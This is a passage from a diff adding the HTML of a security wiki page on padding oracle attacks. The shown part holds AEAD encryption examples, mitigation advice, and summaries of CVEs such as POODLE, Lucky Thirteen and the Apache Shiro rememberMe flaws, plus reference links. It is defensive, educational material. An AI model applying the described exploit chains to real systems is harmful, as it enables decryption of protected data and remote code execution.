+</span></span><span style="display:flex;"><span>   data  <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>decrypt(token)              <span style="color:#75715e"># verify MAC then decrypt — raises on tamper</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Alternative: XSalsa20-Poly1305 via PyNaCl (true AEAD)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">from</span> nacl <span style="color:#f92672">import</span> secret, utils
+</span></span><span style="display:flex;"><span>   key <span style="color:#f92672">=</span> utils<span style="color:#f92672">.</span>random(secret<span style="color:#f92672">.</span>SecretBox<span style="color:#f92672">.</span>KEY_SIZE)
+</span></span><span style="display:flex;"><span>   box <span style="color:#f92672">=</span> secret<span style="color:#f92672">.</span>SecretBox(key)
+</span></span><span style="display:flex;"><span>   encrypted <span style="color:#f92672">=</span> box<span style="color:#f92672">.</span>encrypt(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;plaintext&#34;</span>)
+</span></span><span style="display:flex;"><span>   plaintext <span style="color:#f92672">=</span> box<span style="color:#f92672">.</span>decrypt(encrypted)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>   <span style="color:#75715e">// Node.js — AES-256-GCM via Web Crypto API
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#75715e">// globalThis.crypto is a global since Node 19+ (stable in 20);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#75715e">// on Node 15–18 use: const { webcrypto } = require(&#39;crypto&#39;); then webcrypto.subtle / webcrypto.getRandomValues
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">subtle</span>, <span style="color:#a6e22e">getRandomValues</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">globalThis</span>.<span style="color:#a6e22e">crypto</span>;
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">subtle</span>.<span style="color:#a6e22e">generateKey</span>({ <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;AES-GCM&#39;</span>, <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">256</span> }, <span style="color:#66d9ef">true</span>, [<span style="color:#e6db74">&#39;encrypt&#39;</span>, <span style="color:#e6db74">&#39;decrypt&#39;</span>]);
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">iv</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">getRandomValues</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#ae81ff">12</span>));  <span style="color:#75715e">// 96-bit IV — do not reuse with same key
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ciphertext</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">subtle</span>.<span style="color:#a6e22e">encrypt</span>({ <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;AES-GCM&#39;</span>, <span style="color:#a6e22e">iv</span> }, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">plaintext</span>);
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Auth tag is appended to ciphertext automatically; verified on decrypt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">plaintext</span>  <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">subtle</span>.<span style="color:#a6e22e">decrypt</span>({ <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;AES-GCM&#39;</span>, <span style="color:#a6e22e">iv</span> }, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">ciphertext</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#75715e">// Java — AES-256-GCM
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   SecretKey key <span style="color:#f92672">=</span> KeyGenerator<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;AES&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">generateKey</span><span style="color:#f92672">();</span> <span style="color:#75715e">// use 256-bit key in prod
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> iv <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span><span style="color:#ae81ff">12</span><span style="color:#f92672">];</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">new</span> SecureRandom<span style="color:#f92672">().</span><span style="color:#a6e22e">nextBytes</span><span style="color:#f92672">(</span>iv<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>   Cipher cipher <span style="color:#f92672">=</span> Cipher<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;AES/GCM/NoPadding&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>   cipher<span style="color:#f92672">.</span><span style="color:#a6e22e">init</span><span style="color:#f92672">(</span>Cipher<span style="color:#f92672">.</span><span style="color:#a6e22e">ENCRYPT_MODE</span><span style="color:#f92672">,</span> key<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> GCMParameterSpec<span style="color:#f92672">(</span><span style="color:#ae81ff">128</span><span style="color:#f92672">,</span> iv<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> ciphertext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span><span style="color:#a6e22e">doFinal</span><span style="color:#f92672">(</span>plaintext<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Auth tag (16 bytes) is appended; decryption throws AEADBadTagException on tamper
+</span></span></span></code></pre></div><ol>
+<li><strong>Encrypt-then-MAC</strong> — If CBC must be used, compute HMAC over the ciphertext and verify the MAC before attempting decryption; reject any ciphertext with invalid MAC without decrypting</li>
+<li><strong>Generic Error Responses</strong> — Return identical responses (body, status code, and timing) for all decryption failures — never distinguish padding errors from other errors</li>
+<li><strong>Constant-Time Comparisons</strong> — Use timing-safe comparison functions for MAC verification to prevent timing side-channel oracles</li>
+<li><strong>Disable CBC Ciphersuites in TLS</strong> — Enforce TLS 1.3 (AEAD-only); disable SSLv3, TLS 1.0 CBC suites to eliminate POODLE and Lucky Thirteen</li>
+<li><strong>Upgrade Vulnerable Frameworks</strong> — Apache Shiro ≥ 1.4.2 (AES-GCM); ASP.NET patched builds post CVE-2010-3332; avoid default/hardcoded encryption keys</li>
+</ol>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<h3 id="notable-cves--incidents">
+  Notable CVEs &amp; Incidents
+  <a class="anchor" href="#notable-cves--incidents">#</a>
+</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-3332" target="_blank" rel="noreferrer noopener nofollow">**CVE-2010-3332</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — ASP.NET:** Padding oracle via <code>WebResource.axd</code> enables decryption of ViewState and retrieval of <code>web.config</code>. Affected all ASP.NET versions at the time.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2014-3566" target="_blank" rel="noreferrer noopener nofollow">**CVE-2014-3566</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — POODLE:** Padding oracle combined with SSL 3.0 downgrade — ~256 requests to recover one byte of HTTPS session data.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2013-0169" target="_blank" rel="noreferrer noopener nofollow">**CVE-2013-0169</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Lucky Thirteen:** Timing-based padding oracle against TLS 1.0–1.2 CBC ciphersuites; affects OpenSSL, GnuTLS, NSS.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2016-2107" target="_blank" rel="noreferrer noopener nofollow">**CVE-2016-2107</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — OpenSSL Lucky Thirteen patch bypass:** The fix itself introduced a new timing oracle.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2019-12422" target="_blank" rel="noreferrer noopener nofollow">**CVE-2019-12422</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Apache Shiro (&ldquo;Shiro-721&rdquo;):** <code>rememberMe</code> cookie uses AES-128-CBC; a padding oracle lets an attacker forge a valid encrypted serialized payload — chainable to Java deserialization RCE. Affects Shiro ≤ 1.4.1 (fixed in 1.4.2, which moved to AES-GCM). The attacker does <strong>not</strong> need to know the encryption key.</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2016-4437" target="_blank" rel="noreferrer noopener nofollow">**CVE-2016-4437</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Apache Shiro (&ldquo;Shiro-550&rdquo;):** Hardcoded default AES key for <code>rememberMe</code> (Shiro ≤ 1.2.4) allows direct deserialization RCE with <strong>no</strong> padding oracle required — a distinct, earlier issue from Shiro-721.</li>
+</ul>
+<h3 id="hackerone-reports">
+  HackerOne Reports
+  <a class="anchor" href="#hackerone-reports">#</a>
+</h3>
+<ul>
+<li><a href="https://hackerone.com/reports/728110" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/728110</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/216746" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/216746</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/429966" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/429966</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle" target="_blank" rel="noreferrer noopener nofollow">OWASP WSTG: Testing for Padding Oracle (WSTG-CRYP-02)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hacktricks-wiki-hacktricks.mintlify.app/crypto/padding-oracle-attacks" target="_blank" rel="noreferrer noopener nofollow">HackTricks: Padding Oracle</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/logic-flaws/examples#providing-an-encryption-oracle" target="_blank" rel="noreferrer noopener nofollow">PortSwigger: CBC Bit Flipping &amp; Padding Oracle</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://github.com/AonCyberLabs/PadBuster/pulls" target="_blank" rel="noreferrer noopener nofollow">PadBuster — AonCyberLabs</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://github.com/glebarez/padre" target="_blank" rel="noreferrer noopener nofollow">padre — glebarez</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.torsten-schuetze.de/sommerakademie2009/papers-sekundaer/Vaudenay-CBC-Padding-Flaws-2002.pdf" target="_blank" rel="noreferrer noopener nofollow">Vaudenay, S. (2002): Security Flaws Induced by CBC Padding</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://robertheaton.com/2013/07/29/padding-oracle-attack/" target="_blank" rel="noreferrer noopener nofollow">Robert Heaton: Padding Oracle Attack (2013)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://pentesterlab.com/exercises/padding-oracle" target="_blank" rel="noreferrer noopener nofollow">https://pentesterlab.com/exercises/padding-oracle</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://flast101.github.io/padding-oracle-attack-explained/" target="_blank" rel="noreferrer noopener nofollow">flast101: Padding Oracle Attack</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Padding%20Oracle%20Attacks.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#padding-oracle-attacks">Padding Oracle Attacks</a>
+      <ul>
+        <li><a href="#understanding-the-basics">Understanding the Basics</a>
+          <ul>
+            <li><a href="#cbc-mode--pkcs7-padding">CBC Mode &amp; PKCS#7 Padding</a></li>
+            <li><a href="#the-oracle-signal-types">The Oracle Signal Types</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#exploiting-padding-oracle-attacks">Exploiting Padding Oracle Attacks</a>
+          <ul>
+            <li><a href="#1-identifying-the-oracle">1. Identifying the Oracle</a></li>
+            <li><a href="#2-decrypting-ciphertext-with-padbuster">2. Decrypting Ciphertext with PadBuster</a></li>
+            <li><a href="#3-privilege-escalation-via-cbc-r-forging-arbitrary-plaintext">3. Privilege Escalation via CBC-R (Forging Arbitrary Plaintext)</a></li>
+            <li><a href="#4-aspnet-viewstate--webresourceaxd-cve-2010-3332">4. ASP.NET ViewState / WebResource.axd (CVE-2010-3332)</a></li>
+            <li><a href="#5-apache-shiro-rememberme-cookie-cbc-aes-128">5. Apache Shiro &ldquo;RememberMe&rdquo; Cookie (CBC AES-128)</a></li>
+            <li><a href="#6-timing-based-oracle-lucky-thirteen--blind">6. Timing-Based Oracle (Lucky Thirteen / Blind)</a></li>
+            <li><a href="#test-cases">Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)</a>
+          <ul>
+            <li><a href="#manual-detection--confirming-the-oracle">Manual Detection — Confirming the Oracle</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#notable-cves--incidents">Notable CVEs &amp; Incidents</a></li>
+            <li><a href="#hackerone-reports">HackerOne Reports</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
